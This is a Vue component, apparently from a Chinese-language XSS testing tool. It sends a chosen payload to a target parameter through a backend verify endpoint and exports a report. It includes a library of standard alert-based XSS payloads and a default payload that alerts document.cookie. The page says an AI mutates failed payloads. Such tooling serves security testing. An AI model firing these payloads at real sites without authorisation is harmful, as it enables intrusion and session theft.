<!-- 步骤4：XSS测试 -->
<template>
  <div class="testing-step">
    <div class="step-content">
      <h2 class="step-title">🚀 XSS漏洞测试</h2>

      <div class="test-layout">
        <!-- 左侧：测试目标信息 -->
        <div class="test-target-panel">
          <h3 class="panel-title">测试目标</h3>
          
          <div class="target-info-card">
            <div class="info-item">
              <label>URL:</label>
              <code>{{ truncate(selectedPoint.url, 60) }}</code>
            </div>
            
            <div class="info-item">
              <label>Method:</label>
              <el-tag :type="getMethodColor(selectedPoint.method)">
                {{ selectedPoint.method }}
              </el-tag>
            </div>

            <div class="info-item">
              <label>Type:</label>
              <el-tag type="info">{{ selectedPoint.resource_type }}</el-tag>
            </div>
          </div>

          <!-- 参数选择器 -->
          <div class="param-selector">
            <label class="selector-label">选择注入参数:</label>
            <el-select v-model="selectedParam" placeholder="选择参数" size="large">
              <el-option 
                v-for="param in selectedPoint.injection_points"
                :key="param.name"
                :label="`${param.name} (${param.type})`"
                :value="param.name"
              >
                <span style="float: left">{{ param.name }}</span>
                <span style="float: right; color: #8492a6; font-size: 13px">
                  {{ param.type }}
                </span>
              </el-option>
            </el-select>
          </div>
        </div>

        <!-- 右侧：Payload编辑器 -->
        <div class="payload-panel">
          <h3 class="panel-title">Payload</h3>
          
          <el-input 
            v-model="payload" 
            type="textarea" 
            :rows="8"
            placeholder="输入XSS Payload..."
            class="payload-editor"
          />
          
          <div class="payload-actions">
            <el-button @click="showPayloadLib = true">
              <el-icon><Collection /></el-icon>
              Payload库
            </el-button>
            <el-button 
              type="primary" 
              @click="testPayload" 
              :loading="testing"
              size="large"
            >
              <el-icon><Promotion /></el-icon>
              测试 Payload
            </el-button>
          </div>
        </div>
      </div>

      <!-- 测试进度 -->
      <transition name="fade">
        <div v-if="testing" class="test-progress-card">
          <el-progress :percentage="testProgress" :indeterminate="testProgress === 0" />
          <div class="progress-status">
            <el-icon class="is-loading"><Loading /></el-icon>
            <span>{{ testStatusMessage }}</span>
          </div>
        </div>
      </transition>

      <!--Test Results -->
      <transition name="slide-up">
        <div v-if="testResult" class="test-result-card" :class="testResult.success ? 'success' : 'failed'">
          <div class="result-icon">
            {{ testResult.success ? '✅' : '❌' }}
          </div>
          <div class="result-content">
            <h3>{{ testResult.success ? 'XSSVulnerability Confirmed！' : '未检测到XSS' }}</h3>
            <p>{{ testResult.message }}</p>
          </div>
          
          <div v-if="!testResult.success" class="ai-hint">
            <el-alert type="info" :closable="false">
              <template #title>
                <el-icon><MagicStick /></el-icon>
                AI正在后台尝试Payload变异，请留意右侧Shadow面板...
              </template>
            </el-alert>
          </div>

          <div class="result-actions">
            <el-button @click="testResult = null">清除</el-button>
            <el-button v-if="testResult.success" type="primary" @click="exportResult">
              导出报告
            </el-button>
          </div>
        </div>
      </transition>
    </div>

    <!-- 操作栏 -->
    <div class="step-actions">
      <el-button size="large" @click="$emit('prev')">← 重选注入点</el-button>
      <el-button size="large" @click="resetAndGoHome">Complete测试</el-button>
    </div>

    <!-- Payload库抽屉 -->
    <el-drawer v-model="showPayloadLib" title="Payload库" size="500px">
      <div class="payload-library">
        <el-input 
          v-model="payloadSearch" 
          placeholder="搜索payload..." 
          :prefix-icon="Search"
          class="mb-3"
        />
        
        <div class="payload-list">
          <div 
            v-for="(item, index) in filteredPayloads" 
            :key="index"
            class="payload-item"
            @click="applyPayload(item)"
          >
            <code>{{ item }}</code>
            <el-button size="small" text>应用</el-button>
          </div>
        </div>
      </div>
    </el-drawer>
  </div>
</template>

<script setup>
import { ref, computed } from 'vue'
import { 
  Collection, Promotion, Loading, MagicStick, Search 
} from '@element-plus/icons-vue'
import { ElMessage } from 'element-plus'
import axios from 'axios'

const props = defineProps({
  selectedPoint: {
    type: Object,
    required: true
  }
})

const emit = defineEmits(['prev', 'reset'])

// 状态
const selectedParam = ref(props.selectedPoint.injection_points?.[0]?.name || '')
const payload = ref('<' + 'script>alert(document.cookie)<' + '/script>')
const testing = ref(false)
const testProgress = ref(0)
const testStatusMessage = ref('')
const testResult = ref(null)
const showPayloadLib = ref(false)
const payloadSearch = ref('')

// Payload库
const payloadLibrary = [
  '<' + 'script>alert(1)<' + '/script>',
  '<img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '\'\"><' + 'script>alert(String.fromCharCode(88,83,83))<' + '/script>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<keygen onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<details open ontoggle=alert(1)>'
]

const filteredPayloads = computed(() => {
  if (!payloadSearch.value) return payloadLibrary
  return payloadLibrary.filter(p => 
    p.toLowerCase().includes(payloadSearch.value.toLowerCase())
  )
})

// Test Payload
const testPayload = async () => {
  if (!payload.value.trim()) {
    ElMessage.warning('请输入Payload')
    return
  }
  
  if (!selectedParam.value) {
    ElMessage.warning('请选择注入参数')
    return
  }

  testing.value = true
  testProgress.value = 0
  testResult.value = null

  // 模拟测试进度
  const statusMessages = [
    '正在构造请求...',
    '发送Payload到目标...',
    '等待响应...',
    '分析响应内容...',
    '检测XSS执行...'
  ]
  
  let msgIndex = 0
  const progressInterval = setInterval(() => {
    if (testProgress.value >= 90) {
      clearInterval(progressInterval)
      return
    }
    testProgress.value += 20
    testStatusMessage.value = statusMessages[msgIndex++ % statusMessages.length]
  }, 500)

  try {
    const response = await axios.post('/api/verify', {
      target_url: props.selectedPoint.url,
      payload: payload.value,
      method: props.selectedPoint.method,
      headers: props.selectedPoint.headers,
      post_data: props.selectedPoint.post_data,
      inject_param: selectedParam.value
    })

    clearInterval(progressInterval)
    testProgress.value = 100
    testResult.value = response.data

    if (response.data.success) {
      ElMessage.success('XSSVulnerability Confirmed！')
    } else {
      ElMessage.warning('未检测到XSS执行')
    }
  } catch (error) {
    clearInterval(progressInterval)
    ElMessage.error('Test Failed: ' + error.message)
  } finally {
    testing.value = false
    testProgress.value = 0
  }
}

// 应用Payload
const applyPayload = (payloadText) => {
  payload.value = payloadText
  showPayloadLib.value = false
  ElMessage.success('Payload已应用')
}

// 导出结果
const exportResult = () => {
  const report = {
    target: props.selectedPoint.url,
    method: props.selectedPoint.method,
    param: selectedParam.value,
    payload: payload.value,
    result: testResult.value,
    timestamp: new Date().toISOString()
  }
  
  const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = `xss-report-${Date.now()}.json`
  a.click()
  
  ElMessage.success('报告已导出')
}

// 重置并回首页
const resetAndGoHome = () => {
  emit('reset')
}

// 辅助函数
const getMethodColor = (method) => {
  const colors = {
    'GET': '',
    'POST': 'success',
    'PUT': 'warning',
    'DELETE': 'danger'
  }
  return colors[method] || 'info'
}

const truncate = (str, len) => {
  if (!str || str.length <= len) return str
  return str.substring(0, len) + '...'
}
</script>

<style scoped>
.testing-step {
  display: flex;
  flex-direction: column;
  height: 100%;
}

.step-content {
  flex: 1;
  padding: 40px 60px;
  background: white;
  border-radius: 12px;
  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
  overflow-y: auto;
}

.step-title {
  font-size: 28px;
  color: #303133;
  margin-bottom: 30px;
  font-weight: 600;
}

.test-layout {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 30px;
  margin-bottom: 30px;
}

.test-target-panel,
.payload-panel {
  border: 1px solid #e4e7ed;
  border-radius: 8px;
  padding: 20px;
  background: #fafafa;
}

.panel-title {
  font-size: 18px;
  font-weight: 600;
  color: #303133;
  margin-bottom: 20px;
}

.target-info-card {
  background: white;
  border-radius: 6px;
  padding: 15px;
  margin-bottom: 20px;
}

.info-item {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 12px;
}

.info-item:last-child {
  margin-bottom: 0;
}

.info-item label {
  font-weight: 600;
  color: #606266;
  min-width: 80px;
}

.info-item code {
  flex: 1;
  background: #f5f7fa;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.param-selector {
  margin-top: 20px;
}

.selector-label {
  display: block;
  margin-bottom: 10px;
  font-weight: 600;
  color: #606266;
}

.payload-editor {
  font-family: 'Monaco', 'Courier New', monospace !important;
  font-size: 14px;
}

.payload-actions {
  display: flex;
  justify-content: space-between;
  margin-top: 15px;
}

.test-progress-card {
  background: #ecf5ff;
  border: 1px solid #b3d8ff;
  border-radius: 8px;
  padding: 20px;
  margin-bottom: 20px;
}

.progress-status {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-top: 15px;
  color: #409eff;
  font-weight: 500;
}

.test-result-card {
  border-radius: 12px;
  padding: 30px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 20px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.test-result-card.success {
  background: linear-gradient(135deg, #f0f9eb, #e1f3d8);
  border: 2px solid #67c23a;
}

.test-result-card.failed {
  background: linear-gradient(135deg, #fef0f0, #fde2e2);
  border: 2px solid #f56c6c;
}

.result-icon {
  font-size: 64px;
}

.result-content {
  text-align: center;
}

.result-content h3 {
  font-size: 24px;
  margin-bottom: 10px;
}

.result-content p {
  color: #606266;
  font-size: 14px;
}

.ai-hint {
  width: 100%;
}

.result-actions {
  display: flex;
  gap: 12px;
}

.step-actions {
  display: flex;
  justify-content: space-between;
  padding: 20px 60px;
  background: white;
  border-top: 1px solid #e4e7ed;
  border-radius: 0 0 12px 12px;
  margin-top: 20px;
}

.payload-library {
  height: 100%;
  display: flex;
  flex-direction: column;
}

.mb-3 {
  margin-bottom: 15px;
}

.payload-list {
  flex: 1;
  overflow-y: auto;
}

.payload-item {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px;
  background: #f5f7fa;
  border-radius: 6px;
  margin-bottom: 10px;
  cursor: pointer;
  transition: all 0.3s;
}

.payload-item:hover {
  background: #e4e7ed;
  transform: translateX(4px);
}

.payload-item code {
  flex: 1;
  font-size: 13px;
  color: #303133;
}

/* Transitions */
.fade-enter-active, .fade-leave-active {
  transition: opacity 0.3s;
}

.fade-enter-from, .fade-leave-to {
  opacity: 0;
}

.slide-up-enter-active {
  animation: slideUp 0.5s;
}

@keyframes slideUp {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@media (max-width: 1024px) {
  .test-layout {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 768px) {
  .step-content {
    padding: 20px;
  }
  
  .step-actions {
    padding: 15px 20px;
  }
}
</style>
